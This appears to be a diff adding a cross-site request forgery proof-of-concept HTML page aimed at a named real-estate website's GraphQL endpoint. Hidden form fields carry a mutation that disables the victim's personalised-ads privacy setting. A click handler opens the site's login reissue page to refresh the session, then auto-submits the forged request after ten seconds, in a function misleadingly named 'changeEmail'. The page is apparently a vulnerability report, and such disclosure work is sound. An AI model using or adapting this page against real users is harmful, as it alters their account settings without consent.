@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF_POC</title>
+</head>
+<body>
+    <form action="https://mexa.realestate.com.au/graphql" method="POST" enctype="application/x-www-form-urlencoded">
+  <input type="hidden" name="operationName" value="DisablePrivacySettingQuery">
+  <input type="hidden" name="query" value="mutation DisablePrivacySettingQuery($groupId: PrivacyGroupId!) { disablePrivacySetting(groupId: $groupId) { groupId enabled __typename } }">
+  <input type="hidden" name="variables" value='{"groupId":"PERSONALISED_ADS"}'>
+  <input type="submit" value="Submit GraphQL">
+</form>
+
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://www.realestate.com.au/login/reissue?continueUrl=https%3A%2F%2Fwww.realestate.com.au%2Fmy-real-estate%2Faccount%2Fprivacy');
+        setTimeout(changeEmail, 10000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+</body>
+</html>
